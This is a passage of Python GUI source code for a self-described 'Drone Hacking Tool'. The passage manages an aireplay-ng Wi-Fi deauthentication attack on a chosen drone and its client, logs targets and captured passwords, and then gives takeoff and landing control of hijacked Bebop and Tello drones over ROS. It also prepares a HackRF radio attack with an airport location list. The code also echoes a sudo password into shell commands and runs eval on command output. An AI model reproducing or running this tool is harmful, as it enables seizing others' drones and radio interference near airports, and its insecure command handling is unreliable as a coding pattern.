                    if messagebox.showinfo("Wi-Fi Deauthentication", "Please press 'OK' to stop Wi-Fi Deauthentication attack."):
                        find_xterm_aireplay_pid = "ps ax | grep 'xterm -iconic -T deauthinfo -hold -e aireplay-ng --deauth 0 -a " + selected_bssid + " -c " + selected_ap_client + " " + selected_interface + "'" + " | grep -v grep | grep -v sudo | awk '{print $1}'"
                        get_xterm_aireplay_pid = subprocess.Popen(find_xterm_aireplay_pid, stdout = subprocess.PIPE, shell = True, universal_newlines = True).stdout
                        xterm_aireplay_pid = get_xterm_aireplay_pid.read().splitlines()
                        xterm_aireplay_pid_convert = str(xterm_aireplay_pid) #Convert to string
                        xterm_aireplay_pid_strip = xterm_aireplay_pid_convert.strip("[]") #Remove characters "[]"
                        return_xterm_aireplay_pid = eval(xterm_aireplay_pid_strip) #Remove characters "''"
                        colse_xterm_aireplay = "echo " + sudo_password + " | sudo -S kill " + return_xterm_aireplay_pid
                        close_xterm_aireplay_terminal = subprocess.Popen(colse_xterm_aireplay, stdout = subprocess.PIPE, shell = True) #For close the xterm aireplay terminal
                        close_xterm_aireplay_terminal.wait()
                        time.sleep(0.3)
                        self.destroy_remote_server_login_gui()
                        self.controller.show_frame("StartPage")
                else:
                    self.destroy_remote_server_login_gui()
                    self.controller.show_frame("StartPage")
        except paramiko.AuthenticationException:
            self.progressbar.stop()
            self.info_label.config(text = "Authentication failed.")
            remote_server_timestamp = time.strftime("%Y/%m/%d-%H:%M:%S") #Create a timestamp
            self.check_log_file = Path(current_path + "/data/hack_drone_log.csv")
            if self.check_log_file.is_file(): #Check "hack_drone_log.csv" is really exist
                target_BSSID_log = [selected_bssid]
                channel_log = [selected_channel]
                privacy_log = [selected_privacy]
                password_log = [""]
                manufacturer_log = [matched_manufacturer]
                client_BSSID_log = [selected_ap_client]
                remote_server_timestamp_log = [remote_server_timestamp]
                states_log = ["SSH remote server: " + self.get_user_type_in_ssh_ip + " authentication failed"]
                dataframe = pd.DataFrame({"target_BSSID":target_BSSID_log, "channel":channel_log, "privacy":privacy_log, "password":password_log, "manufacturer":manufacturer_log, "client_BSSID":client_BSSID_log, "timestamp":remote_server_timestamp_log, "states":states_log})
                dataframe.to_csv(current_path + "/data/hack_drone_log.csv", index = False, sep = ",", mode = "a", header = False) #Write log data to "drone_attack_log.csv"
            if messagebox.showerror("Error", "Authentication Failed.\nInvalid username or password, please try again."):
                self.info_label.config(text = "Ready.")
                self.ssh_ip_inputbox.config(state = "normal")
                self.ssh_port_inputbox.config(state = "normal")
                self.ssh_user_name_inputbox.config(state = "normal")
                self.ssh_user_password_inputbox.config(state = "normal")
                self.start_button.config(state = "normal")
                self.ssh_user_name_inputbox.delete(0, "end") #Clear inputbox string
                self.ssh_user_password_inputbox.delete(0, "end") #Clear inputbox string
        except socket.timeout:
            self.progressbar.stop()
            self.info_label.config(text = "Connection timed out.")
            if messagebox.showerror("Error", "Connection timed out, please try again."):
                self.info_label.config(text = "Ready.")
                self.ssh_ip_inputbox.config(state = "normal")
                self.ssh_port_inputbox.config(state = "normal")
                self.ssh_user_name_inputbox.config(state = "normal")
                self.ssh_user_password_inputbox.config(state = "normal")
                self.start_button.config(state = "normal")

    def destroy_remote_server_login_gui(self): #Kill remote_server_login_gui object
        self.failed_to_find_get_four_way_handshake_convert_file = False
        self.password_dictionary = False
        self.wifi_deauthentication_states = True
        self.title_label.destroy()
        self.subtitle_label.destroy()
        self.ssh_service_connect_label.destroy()
        self.ssh_ip_label.destroy()
        self.ssh_ip_inputbox.destroy()
        self.ssh_ip_label_ssh_ip_inputbox_frame.destroy()
        self.ssh_port_label.destroy()
        self.ssh_port_inputbox.destroy()
        self.ssh_port_label_ssh_port_inputbox_frame.destroy()
        self.ssh_user_name_label.destroy()
        self.ssh_user_name_inputbox.destroy()
        self.ssh_user_name_label_ssh_user_name_inputbox_frame.destroy()
        self.ssh_user_password_label.destroy()
        self.ssh_user_password_inputbox.destroy()
        self.ssh_user_password_label_ssh_user_password_inputbox_frame.destroy()
        self.info_label.destroy()
        self.start_button.destroy()
        self.footer_frame.destroy()


class DroneControl(tk.Frame):

    def __init__(self, parent, controller):
        tk.Frame.__init__(self, parent)
        self.controller = controller
        self.bind("<<ShowFrame>>", self.thread_control)

    def thread_control(self, event):
        threading.Thread(target = self.drone_attack_gui).start()
        threading.Thread(target = self.load_ros).start()

    def drone_attack_gui(self):
        self.title_label = tk.Label(self, background = "white", text = "Control target:", font = self.controller.title_font)
        self.title_label.pack(side = "top", fill = "x", pady = 5)

        self.manufacturer_restart_camera_button_frame = tk.Frame(self)
        self.manufacturer_restart_camera_button_frame.config(background = "white")

        self.manufacturer_label = tk.Label(self.manufacturer_restart_camera_button_frame, background = "white", text = "", font = self.controller.label_font)
        self.manufacturer_label.pack(side = "left", anchor = "nw", pady = 5)

        update_manufacturer_label = "Manufacturer: " + matched_manufacturer
        self.manufacturer_label.config(text = update_manufacturer_label)

        try:
            self.restart_camera_button_icon = tk.PhotoImage(file = current_path + "/data/gui_img/refresh_icon.png")
            
            self.restart_camera_button = tk.Button(self.manufacturer_restart_camera_button_frame, background = "white", text = "Restart camera", font = self.controller.button_font, state = "disable", image = self.restart_camera_button_icon, compound = "left",
                                command = lambda: threading.Thread(target = self.restart_camera).start())
            self.restart_camera_button.pack(side = "right", anchor = "ne")
        except: #If icon not found
            self.restart_camera_button = tk.Button(self.manufacturer_restart_camera_button_frame, background = "white", text = "Restart camera", font = self.controller.button_font, state = "disable",
                                command = lambda: threading.Thread(target = self.restart_camera).start())
            self.restart_camera_button.pack(side = "right", anchor = "ne")
        self.manufacturer_restart_camera_button_frame.pack(side = "top", fill = "both")
        
        try:
            self.takeoff_button_icon = tk.PhotoImage(file = current_path + "/data/gui_img/takeoff_icon.png")
            self.landing_button_icon = tk.PhotoImage(file = current_path + "/data/gui_img/landing_icon.png")
            
            self.takeoff_button = tk.Button(self, background = "white", text="Takeoff", font = self.controller.drone_control_button_font, state = "disable", image = self.takeoff_button_icon, compound = "top",
                            command = lambda: self.takeoff())
            self.takeoff_button.pack(side = "top", fill = "both", padx = 10, pady = 5, expand = True)

            self.landing_button = tk.Button(self, background = "white", text="Landing", font = self.controller.drone_control_button_font, state = "disable", image = self.landing_button_icon, compound = "top",
                            command = lambda: self.landing())
            self.landing_button.pack(side = "top", fill = "both", padx = 10, pady = 5, expand = True)
        except: #If icon not found
            self.takeoff_button = tk.Button(self, background = "white", text="Takeoff", font = self.controller.drone_control_button_font, state = "disable",
                            command = lambda: self.takeoff())
            self.takeoff_button.pack(side = "top", fill = "both", padx = 10, pady = 5, expand = True)

            self.landing_button = tk.Button(self, background = "white", text="Landing", font = self.controller.drone_control_button_font, state = "disable",
                            command = lambda: self.landing())
            self.landing_button.pack(side = "top", fill = "both", padx = 10, pady = 5, expand = True)

        self.info_label = tk.Label(self, background = "white", text = "Initialization Robot Operating System.", font = self.controller.info_font)
        self.info_label.pack(side = "left", anchor = "sw", pady = 5)

        try:
            self.bace_to_homepage_button_icon = tk.PhotoImage(file = current_path + "/data/gui_img/home_icon.png")
                
            self.bace_to_homepage_button = tk.Button(self, background = "white", text = "Back to homepage", font = self.controller.button_font, image = self.bace_to_homepage_button_icon, compound = "left",
                                        command = lambda: threading.Thread(target = self.destroy_drone_attack_gui).start())
            self.bace_to_homepage_button.pack(side = "right", anchor = "se")
        except: #If icon not found
            self.bace_to_homepage_button = tk.Button(self, background = "white", text = "Back to homepage", font = self.controller.button_font,
                                        command = lambda: threading.Thread(target = self.destroy_drone_attack_gui).start())
            self.bace_to_homepage_button.pack(side = "right", anchor = "se")

    def load_ros(self): #Turn on roscore
        start_ros = "gnome-terminal --geometry=1x1 --working-directory=myfolder -x bash -c 'roscore'"
        subprocess.Popen(start_ros, stdout = subprocess.PIPE, shell = True)
        time.sleep(0.5)
        self.info_label.config(text = "Turning on your target camera.")
        time.sleep(1.0)
        threading.Thread(target = self.load_camera).start()

    def load_camera(self): #Turn on drone camera
        try:
            if "Parrot Sa@Bebop 2" in matched_manufacturer: #Bebop drone
                turn_on_bebop_driver_camera = "gnome-terminal --geometry=1x1 --working-directory=myfolder -x bash -c 'source bebop_ws/devel/setup.bash; roslaunch bebop_tools bebop_nodelet_iv.launch'"
                subprocess.Popen(turn_on_bebop_driver_camera, stdout = subprocess.PIPE, shell = True)
                time.sleep(12.0)
                self.restart_camera_button.config(state = "normal")
                self.takeoff_button.config(state = "normal")
                self.landing_button.config(state = "normal")
                self.info_label.config(text = "Done.")
            elif "Sz Dji Technology Co.,Ltd@Tello" in matched_manufacturer: #Tello drone
                turn_on_tello_driver = "gnome-terminal --geometry=1x1 --working-directory=myfolder -x bash -c 'source tello_ws/devel/setup.bash; roslaunch tello_driver tello_node.launch'"
                turn_on_tello_camera =  "gnome-terminal --geometry=1x1 --working-directory=myfolder -x bash -c 'source tello_ws/devel/setup.bash; rosrun rqt_image_view rqt_image_view /tello/image_raw/h264'"
                subprocess.Popen(turn_on_tello_driver, stdout = subprocess.PIPE, shell = True)
                time.sleep(3.0)
                subprocess.Popen(turn_on_tello_camera, stdout = subprocess.PIPE, shell = True)
                time.sleep(3.0)
                self.restart_camera_button.config(state = "normal")
                self.takeoff_button.config(state = "normal")
                self.landing_button.config(state = "normal")
                self.info_label.config(text = "Done.")
            elif "Sz Dji Technology Co.,Ltd@Spark" in matched_manufacturer: #Spark drone
                self.info_label.config(text = "Device Not Supported.")
                self.takeoff_button.config(state = "disable")
                self.landing_button.config(state = "disable")
                spark_message = "To continue, please use the Android emulator and download 'DJI GO 4' application."
                if messagebox.showerror("Device Not Supported", spark_message):
                    threading.Thread(target = self.destroy_drone_attack_gui).start()
            else:
                self.restart_camera_button.config(state = "disable")
                self.takeoff_button.config(state = "disable")
                self.landing_button.config(state = "disable")
                self.info_label.config(text = "Not support this target.")
                messagebox.showerror("Error", "Not support this target.")
        except:
            if messagebox.askretrycancel("Error", "An error occurred while turning on your target camera."):
                self.load_camera()

    def takeoff(self): #Drone takeoff
        try:
            if "Parrot Sa@Bebop 2" in matched_manufacturer: #Bebop drone
                takeoff_bebop = "/bin/bash ~/bebop_ws/devel/setup.bash;rostopic pub bebop/takeoff std_msgs/Empty"
                subprocess.Popen(takeoff_bebop, stdout = subprocess.PIPE, shell = True)
            elif "Sz Dji Technology Co.,Ltd@Tello" in matched_manufacturer: #Tello drone
                takeoff_tello = "/bin/bash ~/tello_ws/devel/setup.bash; rostopic pub tello/takeoff std_msgs/Empty"
                subprocess.Popen(takeoff_tello, stdout = subprocess.PIPE, shell = True)
            else:
                messagebox.askretrycancel("Error", "Not support this target.") 
        except:
            messagebox.askretrycancel("Error", "An error occurred while processing your request.")

    def landing(self): #Drone landing
        try:
            if "Parrot Sa@Bebop 2" in matched_manufacturer: #Bebop drone
                landing_bebop = "/bin/bash ~/bebop_ws/devel/setup.bash;rostopic pub bebop/land std_msgs/Empty"
                subprocess.Popen(landing_bebop, stdout = subprocess.PIPE, shell = True)
            elif "Sz Dji Technology Co.,Ltd@Tello" in matched_manufacturer: #Tello drone
                landing_tello = "/bin/bash ~/tello_ws/devel/setup.bash; rostopic pub tello/land std_msgs/Empty"
                subprocess.Popen(landing_tello, stdout = subprocess.PIPE, shell = True)
            else:
                messagebox.askretrycancel("Error", "Not support this target.")
        except:
            messagebox.askretrycancel("Error", "An error occurred while processing your request.")

    def restart_camera(self):
        self.info_label.config(text = "Restarting camera, please wait.")
        self.restart_camera_button.config(state = "disable") 
        self.takeoff_button.config(state = "disable")
        self.landing_button.config(state = "disable")
        if "Sz Dji Technology Co.,Ltd@Tello" in matched_manufacturer:
            try:
                subprocess.Popen("ps aux | grep 'rqt_image_view/rqt_image_view /tello/image_raw/h264' | awk '{print $2}' | xargs sudo kill -9", stdout = subprocess.PIPE, shell = True) #Close camera
                time.sleep(0.5)
            except:
                pass
        try:
            subprocess.Popen("rosnode kill -a", stdout = subprocess.PIPE, shell = True) #Close camera
            time.sleep(2.0)
        except: #If process not found
            pass
        try:
            subprocess.Popen("echo " + sudo_password + " | sudo -S killall -9 rosmaster", stdout = subprocess.PIPE, shell = True) #Close roscore
            time.sleep(2.0)
        except:
            pass
        threading.Thread(target = self.load_ros).start()

    def destroy_drone_attack_gui(self):
        self.info_label.config(text = "Closing all ROS process, please wait.")
        self.takeoff_button.config(state = "disable")
        self.landing_button.config(state = "disable")
        self.restart_camera_button.config(state = "disable")
        self.bace_to_homepage_button.config(state = "disable")
        if "Sz Dji Technology Co.,Ltd@Tello" in matched_manufacturer:
            try:
                subprocess.Popen("ps aux | grep 'rqt_image_view/rqt_image_view /tello/image_raw/h264' | awk '{print $2}' | xargs sudo kill -9", stdout = subprocess.PIPE, shell = True) #Close camera
                time.sleep(0.5)
            except:
                pass
        try:
            subprocess.Popen("rosnode kill -a", stdout = subprocess.PIPE, shell = True) #Close camera
            time.sleep(2.0)
        except:
            pass
        try:
            subprocess.Popen("echo " + sudo_password + " | sudo -S killall -9 rosmaster", stdout = subprocess.PIPE, shell = True) #Close roscore
            time.sleep(1.0)
        except:
            pass
        self.title_label.destroy()
        self.manufacturer_label.destroy()
        self.restart_camera_button.destroy()
        self.manufacturer_restart_camera_button_frame.destroy()
        self.takeoff_button.destroy()
        self.landing_button.destroy()
        self.info_label.destroy()
        self.bace_to_homepage_button.destroy()
        self.controller.show_frame("StartPage")


class FindHackrfDevice(tk.Frame):

    def __init__(self, parent, controller):
        tk.Frame.__init__(self, parent)
        self.controller = controller
        self.bind("<<ShowFrame>>", self.thread_control)

    def thread_control(self, event):
        threading.Thread(target = self.show_hackrf_info_gui).start()
        threading.Thread(target = self.get_hackrf_info).start()

    def show_hackrf_info_gui(self):
        self.title_label = tk.Label(self, background = "white", text = "Connect to HackRF One:", font = self.controller.title_font)
        self.title_label.pack(side = "top", fill = "x", pady = 5)

        try:
            self.label_hackrf_one_image = tk.PhotoImage(file = current_path + "/data/gui_img/hackrf_one.png")
            self.label_loading_icon = tk.PhotoImage(file = current_path + "/data/gui_img/loading_icon.png")
            self.label_success_icon = tk.PhotoImage(file = current_path + "/data/gui_img/finish_icon.png")
            self.label_fail_icon = tk.PhotoImage(file = current_path + "/data/gui_img/fail_icon.png")

            self.hackrf_one_label = tk.Label(self, background = "white", image = self.label_hackrf_one_image)
            self.hackrf_one_label.pack(side = "top", pady = 10)

            self.hackrf_states_label = tk.Label(self, background = "white", text = "HackRF states:             Collecting data ", font = self.controller.label_font, image = self.label_loading_icon, compound = "right")
            self.hackrf_states_label.pack(side = "top", anchor = "w", pady = 10)
        except: #If image not found
            self.hackrf_one_label = tk.Label(self, background = "white", text = "HackRF One™\nGREAT SCOTT GADGETS™", font = (None, 12, "bold"))
            self.hackrf_one_label.pack(side = "top", pady = 10)

            self.hackrf_states_label = tk.Label(self, background = "white", text = "HackRF states:             Collecting data")
            self.hackrf_states_label.pack(side = "top", anchor = "w", pady = 10)

        self.usb_descriptor_string_label = tk.Label(self, background = "white", text = "USB descriptor string: Unknown", font = self.controller.label_font)
        self.usb_descriptor_string_label.pack(side = "top", anchor = "w", pady = 10)

        self.board_id_number_label = tk.Label(self, background = "white", text = "Board ID Number:        Unknown", font = self.controller.label_font)
        self.board_id_number_label.pack(side = "top", anchor = "w", pady = 10)

        self.firmware_version_label = tk.Label(self, background = "white", text = "Firmware Version:        Unknown", font = self.controller.label_font)
        self.firmware_version_label.pack(side = "top", anchor = "w", pady = 10)

        self.part_id_number_label = tk.Label(self, background = "white", text = "Part ID Number:           Unknown", font = self.controller.label_font)
        self.part_id_number_label.pack(side = "top", anchor = "w", pady = 10)

        self.serial_number_label = tk.Label(self, background = "white", text = "Serial Number:              Unknown", font = self.controller.label_font)
        self.serial_number_label.pack(side = "top", anchor = "w", pady = 10)

        try:
            self.back_button_icon = tk.PhotoImage(file = current_path + "/data/gui_img/back_icon.png")
            self.next_button_icon = tk.PhotoImage(file = current_path + "/data/gui_img/next_icon.png")
            
            self.back_button = tk.Button(self, background = "white", text="Back", font = self.controller.button_font, image = self.back_button_icon, compound = "left",
                               command = lambda: [self.destroy_show_hackrf_info_gui(), self.controller.show_frame("StartPage")])
            self.back_button.pack(side = "left", anchor = "sw")

            self.next_button = tk.Button(self, background = "white", text="Next", font = self.controller.button_font, state = "disable", image = self.next_button_icon, compound = "right",
                            command = lambda: [self.destroy_show_hackrf_info_gui(), self.controller.show_frame("RFLocationSelect")])
            self.next_button.pack(side = "right", anchor = "se")
        except: #If icon not found
            self.back_button = tk.Button(self, background = "white", text="Back", font = self.controller.button_font,
                               command = lambda: [self.destroy_show_hackrf_info_gui(), self.controller.show_frame("StartPage")])
            self.back_button.pack(side = "left", anchor = "sw")

            self.next_button = tk.Button(self, background = "white", text="Next", font = self.controller.button_font, state = "disable",
                            command = lambda: [self.destroy_show_hackrf_info_gui(), self.controller.show_frame("RFLocationSelect")])
            self.next_button.pack(side = "right", anchor = "se")

    def menubar(self, tool):
        menubar = tk.Menu(tool)
        option_tool = tk.Menu(menubar, tearoff = 0)
        option_tool.add_command(label = "Back", command = lambda: [self.destroy_show_hackrf_info_gui(), self.controller.show_frame("StartPage")])
        option_tool.add_separator()  
        option_tool.add_command(label = "Exit", command = lambda: quit())
        menubar.add_cascade(label = "Option", menu = option_tool)
        help_tool = tk.Menu(menubar, tearoff = 0)
        help_tool.add_command(label = "Page guide", command = lambda: messagebox.showinfo("Page Guide",
                                    "To start, please ready your HackRF One and install 'hackrf' tools.\n\nIf you are connected to your HackRF One correctly, you can see the device information on the screen."))
        help_tool.add_command(label = "About", command = lambda: messagebox.showinfo("Drone Hacking Tool",
                                    "Code name: Barbary lion\nVersion: 1.1.2.111\n\nGroup member:\nSam KAN\nMichael YUEN\nDicky SHEK"))
        menubar.add_cascade(label = "Help", menu = help_tool)
        return menubar

    def get_hackrf_info(self):
        get_hackrf_info_states = subprocess.Popen("hackrf_info", stdout = subprocess.PIPE, stderr = subprocess.STDOUT, shell = True, universal_newlines = True).stdout
        hackrf_info_states = get_hackrf_info_states.read().splitlines()
        hackrf_info_states_convert = str(hackrf_info_states) #Convert to string
        hackrf_info_states_convert_strip = hackrf_info_states_convert.strip("[(,)]") #Remove characters "[(,)]"
        hackrf_info_states_result = eval(hackrf_info_states_convert_strip)
        #print(hackrf_info_states_result)
        time.sleep(0.3)
        self.next_button.config(state = "normal")
        if hackrf_info_states_result == "No HackRF boards found.": # If HackRF not found
            show_hackrf_info_timestamp = time.strftime("%Y/%m/%d-%H:%M:%S") #Create a timestamp
            self.check_log_file = Path(current_path + "/data/hack_drone_log.csv")
            if self.check_log_file.is_file(): #Check "hack_drone_log.csv" is really exist
                target_BSSID_log = [""]
                channel_log = [""]
                privacy_log = [""]
                password_log = [""]
                manufacturer_log = [""]
                client_BSSID_log = [""]
                selected_ap_timestamp_log = [show_hackrf_info_timestamp]
                states_log = ["Error: No HackRF boards found"]
                dataframe = pd.DataFrame({"target_BSSID":target_BSSID_log, "channel":channel_log, "privacy":privacy_log, "password":password_log, "manufacturer":manufacturer_log, "client_BSSID":client_BSSID_log,"timestamp":selected_ap_timestamp_log, "states":states_log})
                dataframe.to_csv(current_path + "/data/hack_drone_log.csv", index = False, sep = ',', mode = "a", header = False) #Write log data to "drone_attack_log.csv"
            try:
                self.hackrf_states_label.config(text = "HackRF states:             Not found ", image = self.label_fail_icon, compound = "right")
            except:
                self.hackrf_states_label.config(text = "HackRF states:             Not found")
            self.usb_descriptor_string_label.config(text = "USB descriptor string: Unknown")
            self.board_id_number_label.config(text = "Board ID Number:        Unknown")
            self.firmware_version_label.config(text = "Firmware Version:        Unknown")
            self.part_id_number_label.config(text = "Part ID Number:           Unknown")
            self.serial_number_label.config(text = "Serial Number:              Unknown")
            if messagebox.askretrycancel("Error", "No HackRF boards found."):
                try:
                    self.hackrf_states_label.config(text = "HackRF states:             Collecting data ", image = self.label_loading_icon, compound = "right")
                except: #If icon not found
                    self.hackrf_states_label.config = tk.Label(self, text = "HackRF states:             Collecting data")
                self.get_hackrf_info()
            else: 
                self.destroy_show_hackrf_info_gui()
                self.controller.show_frame("StartPage")
        elif "hackrf_info: not found" in hackrf_info_states_result:
            show_hackrf_info_timestamp = time.strftime("%Y/%m/%d-%H:%M:%S") #Create a timestamp
            self.check_log_file = Path(current_path + "/data/hack_drone_log.csv")
            if self.check_log_file.is_file(): #Check "hack_drone_log.csv" is really exist
                target_BSSID_log = [""]
                channel_log = [""]
                privacy_log = [""]
                password_log = [""]
                manufacturer_log = [""]
                client_BSSID_log = [""]
                selected_ap_timestamp_log = [show_hackrf_info_timestamp]
                states_log = ["Error: 'hackrf' tools is not found"]
                dataframe = pd.DataFrame({"target_BSSID":target_BSSID_log, "channel":channel_log, "privacy":privacy_log, "password":password_log, "manufacturer":manufacturer_log, "client_BSSID":client_BSSID_log,"timestamp":selected_ap_timestamp_log, "states":states_log})
                dataframe.to_csv(current_path + "/data/hack_drone_log.csv", index = False, sep = ',', mode = "a", header = False) #Write log data to "drone_attack_log.csv"  
            try:
                self.hackrf_states_label.config(text = "HackRF states:             Fail, 'hackrf' tools not found ", image = self.label_fail_icon, compound = "right")
            except: #If icon not found
                self.hackrf_states_label.config(text = "HackRF states:             Fail, 'hackrf' tools not found")
            self.usb_descriptor_string_label.config(text = "USB descriptor string: Unknown")
            self.board_id_number_label.config(text = "Board ID Number:        Unknown")
            self.firmware_version_label.config(text = "Firmware Version:        Unknown")
            self.part_id_number_label.config(text = "Part ID Number:           Unknown")
            self.serial_number_label.config(text = "Serial Number:              Unknown")
            if messagebox.showerror("Error", "Unfortunately, 'hackrf' tools is not found.\nFor continue, you must install 'hackrf' tools to your device."):
                self.destroy_show_hackrf_info_gui()
                self.controller.show_frame("StartPage")
        else:
            collect_hackrf_usb_descriptor_string = "hackrf_info 2>&1 | grep 'USB descriptor string:'"
            collect_hackrf_board_id_number = "hackrf_info 2>&1 | grep 'Board ID Number:'"
            collect_hackrf_firmware_version = "hackrf_info 2>&1 | grep 'Firmware Version:'"
            collect_hackrf_part_id_number = "hackrf_info 2>&1 | grep 'Part ID Number:'"
            collect_hackrf_serial_number = "hackrf_info 2>&1 | grep 'Serial Number:'"

            get_hackrf_usb_descriptor_string = subprocess.Popen(collect_hackrf_usb_descriptor_string, stdout = subprocess.PIPE, stderr = subprocess.STDOUT, shell = True, universal_newlines = True).stdout
            hackrf_usb_descriptor_string = get_hackrf_usb_descriptor_string.read().splitlines()
            hackrf_usb_descriptor_string_convert = str(hackrf_usb_descriptor_string) #Convert to string     
            hackrf_usb_descriptor_string_convert_strip = hackrf_usb_descriptor_string_convert.strip("[(,)]") #Remove characters "[(,)]"
            hackrf_usb_descriptor_string_convert_replace = hackrf_usb_descriptor_string_convert_strip.replace("USB descriptor string: ", "")
            hackrf_usb_descriptor_string_result = eval(hackrf_usb_descriptor_string_convert_replace)
            #print(hackrf_usb_descriptor_string_result)
            get_hackrf_board_id_number = subprocess.Popen(collect_hackrf_board_id_number, stdout = subprocess.PIPE, stderr = subprocess.STDOUT, shell = True, universal_newlines = True).stdout
            hackrf_board_id_number = get_hackrf_board_id_number.read().splitlines()
            hackrf_board_id_number_convert = str(hackrf_board_id_number) #Convert to string     
            hackrf_board_id_number_convert_strip = hackrf_board_id_number_convert.strip("[(,)]") #Remove characters "[(,)]"
            hackrf_board_id_number_convert_replace = hackrf_board_id_number_convert_strip.replace("Board ID Number: ", "")
            hackrf_board_id_number_result = eval(hackrf_board_id_number_convert_replace)
            #print(hackrf_board_id_number_result)
            get_hackrf_firmware_version = subprocess.Popen(collect_hackrf_firmware_version, stdout = subprocess.PIPE, stderr = subprocess.STDOUT, shell = True, universal_newlines = True).stdout
            hackrf_firmware_version = get_hackrf_firmware_version.read().splitlines()
            hackrf_firmware_version_convert = str(hackrf_firmware_version) #Convert to string     
            hackrf_firmware_version_convert_strip = hackrf_firmware_version_convert.strip("[(,)]") #Remove characters "[(,)]"
            hackrf_firmware_version_convert_replace = hackrf_firmware_version_convert_strip.replace("Firmware Version: ", "")
            hackrf_firmware_version_result = eval(hackrf_firmware_version_convert_replace)
            #print(hackrf_firmware_version_result)
            get_hackrf_part_id_number = subprocess.Popen(collect_hackrf_part_id_number, stdout = subprocess.PIPE, stderr = subprocess.STDOUT, shell = True, universal_newlines = True).stdout
            hackrf_part_id_number = get_hackrf_part_id_number.read().splitlines()
            hackrf_part_id_number_convert = str(hackrf_part_id_number) #Convert to string     
            hackrf_part_id_number_convert_strip = hackrf_part_id_number_convert.strip("[(,)]") #Remove characters "[(,)]"
            hackrf_part_id_number_convert_replace = hackrf_part_id_number_convert_strip.replace("Part ID Number: ", "")
            hackrf_part_id_number_result = eval(hackrf_part_id_number_convert_replace)
            #print(hackrf_part_id_number_result)
            get_hackrf_serial_number = subprocess.Popen(collect_hackrf_serial_number, stdout = subprocess.PIPE, stderr = subprocess.STDOUT, shell = True, universal_newlines = True).stdout
            hackrf_serial_number = get_hackrf_serial_number.read().splitlines()
            hackrf_serial_number_convert = str(hackrf_serial_number) #Convert to string
            hackrf_serial_number_convert_strip = hackrf_serial_number_convert.strip("[(,)]") #Remove characters "[(,)]"
            hackrf_serial_number_convert_replace = hackrf_serial_number_convert_strip.replace("Serial Number: ", "")
            hackrf_serial_number_result = eval(hackrf_serial_number_convert_replace)
            #print(hackrf_serial_number_result) 
            try:
                self.hackrf_states_label.config(text = "HackRF states:             Normal ", image = self.label_success_icon, compound = "right")
            except: #If icon not found
                self.hackrf_states_label.config(text = "HackRF states:             Normal")
            self.usb_descriptor_string_label.config(text = "USB descriptor string: " + hackrf_usb_descriptor_string_result)
            self.board_id_number_label.config(text = "Board ID Number:        " + hackrf_board_id_number_result)
            self.firmware_version_label.config(text = "Firmware Version:        " + hackrf_firmware_version_result)
            self.part_id_number_label.config(text = "Part ID Number:           " +  hackrf_part_id_number_result)
            self.serial_number_label.config(text = "Serial Number:              " + hackrf_serial_number_result)
            show_hackrf_info_timestamp = time.strftime("%Y/%m/%d-%H:%M:%S") #Create a timestamp
            self.check_log_file = Path(current_path + "/data/hack_drone_log.csv")
            if self.check_log_file.is_file(): #Check "hack_drone_log.csv" is really exist
                target_BSSID_log = [""]
                channel_log = [""]
                privacy_log = [""]
                password_log = [""]
                manufacturer_log = [""]
                client_BSSID_log = [""]
                selected_ap_timestamp_log = [show_hackrf_info_timestamp]
                states_log = ["HackRF One " + hackrf_usb_descriptor_string_result + "connected"]
                dataframe = pd.DataFrame({"target_BSSID":target_BSSID_log, "channel":channel_log, "privacy":privacy_log, "password":password_log, "manufacturer":manufacturer_log, "client_BSSID":client_BSSID_log,"timestamp":selected_ap_timestamp_log, "states":states_log})
                dataframe.to_csv(current_path + "/data/hack_drone_log.csv", index = False, sep = ',', mode = "a", header = False) #Write log data to "drone_attack_log.csv"  
        
    def destroy_show_hackrf_info_gui(self):
        self.title_label.destroy()
        self.hackrf_one_label.destroy()
        self.hackrf_states_label.destroy()
        self.usb_descriptor_string_label.destroy()
        self.board_id_number_label.destroy()
        self.firmware_version_label.destroy()
        self.part_id_number_label.destroy()
        self.serial_number_label.destroy()
        self.back_button.destroy()
        self.next_button.destroy()


class RFLocationSelect(tk.Frame):

    def __init__(self, parent, controller):
        tk.Frame.__init__(self, parent)
        self.controller = controller
        self.bind("<<ShowFrame>>", self.thread_control)
        self.messagebox_tips_state = True

    def thread_control(self, event):
        threading.Thread(target = self.rf_attack_gui).start()
        #threading.Thread(target = self.get_hackrf_info).start()

    def rf_attack_gui(self):
        self.title_label = tk.Label(self, background = "white", text="Select a location:", font = self.controller.title_font)
        self.title_label.pack(side = "top", fill = "x", pady = 10)

        try:
            self.world_map_display = tk.PhotoImage(file = current_path + "/data/gui_img/world_map.png")
            
            self.world_map_display_label = tk.Label(self, background = "white", image = self.world_map_display)
            self.world_map_display_label.pack(side = "top", pady = 10)
        except: #If image not found
            self.world_map_display_label = tk.Label(self, background = "white", text = "Unable to display world map.")
            self.world_map_display_label.pack(side = "top", pady = 10)

        self.check_airports_location_list = Path(current_path + "/data/airports_location_list.csv")
        if self.check_airports_location_list.is_file(): #Check "airports_location_list" is really exist
            read_airports_location_list_cap = pd.read_csv(current_path + "/data/airports_location_list.csv", usecols=[0]) #Read csv "drone_manufacturer_list.csv" file
            read_airports_location_list_df = pd.DataFrame(read_airports_location_list_cap)
            airports_location_list = read_airports_location_list_df.values.tolist()
            airports_location_list_strip = str(airports_location_list) #Convert to string
            airports_location_list_replace_1 = airports_location_list_strip.replace("[", "") #Remove characters "["
            airports_location_list_replace_2 = airports_location_list_replace_1.replace("]", "") #Remove characters "]"
            airports_location_list_replace_3 = airports_location_list_replace_2.replace("'", "") #Remove characters "'"
            airports_location_list_add_option = airports_location_list_replace_3 + ", Customize"
            airports_location_option_list = list(airports_location_list_add_option.split(", ")) 
        else:
            airports_location_option_list = ["Customize"]
            
        self.location_select_list_variable = tk.StringVar(self)
        self.location_select_list_variable.set("Select a location")
        self.location_select_list = tk.OptionMenu(self, self.location_select_list_variable, *airports_location_option_list)
        self.location_select_list.config(background = "white", font = "self.controller.label_font")
        self.location_select_list["menu"].config(background = "white", font = "self.controller.label_font")
        self.location_select_list.pack(side = "top", fill = "x")
        self.location_select_list_variable.trace("w", self.get_selected_location)

        self.latitude_label_latitude_inputbox_frame = tk.Frame(self)
        self.latitude_label_latitude_inputbox_frame.config(background = "white")
        self.latitude_label = tk.Label(self.latitude_label_latitude_inputbox_frame, background = "white", text = "Latitude:    ", font = "self.controller.label_font")
        self.latitude_label.pack(side = "left", anchor = "w")

        self.latitude_inputbox = tk.Entry(self.latitude_label_latitude_inputbox_frame, font = "self.controller.label_font")
        self.latitude_inputbox.pack(fill = "x")
        self.latitude_inputbox.config(state = "disable")
